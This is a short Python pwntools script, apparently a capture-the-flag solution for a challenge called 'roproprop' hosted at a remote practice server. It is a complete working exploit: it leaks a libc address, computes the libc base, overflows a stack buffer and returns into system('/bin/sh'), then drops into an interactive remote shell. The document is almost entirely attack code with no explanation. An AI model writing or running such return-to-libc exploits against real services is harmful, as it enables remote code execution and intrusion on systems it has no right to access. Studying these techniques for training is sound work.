from pwn import *

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

"""
read(0, ebp-0x4ca, 0x192f)
"""

# p = process("./roproprop")
p = remote("plsdonthaq.me", 6003)

# 0xf7d5a000 0xf7eb5000 r-xp   15b000 1d000  /usr/lib/i386-linux-gnu/libc-2.31.so
p.recvuntil("- ")
leak = int(p.recvuntil(" -", drop=True), 16) # ebx+0x1c || setbuf@GOT
setbuf_offset = 0x65ff0
libc_base = leak - setbuf_offset
print(f"Leaked libc base: {hex(libc_base)}")

'''
0x15ba0b: "/bin/sh\0"
0x3ada0: system()
'''

payload = b""
payload += b'\x90' * (0x4ca+4)
payload += p32(libc_base + 0x3ada0)
payload += b'....'
payload += p32(libc_base + 0x15ba0b)

p.sendline(payload)
p.interactive()
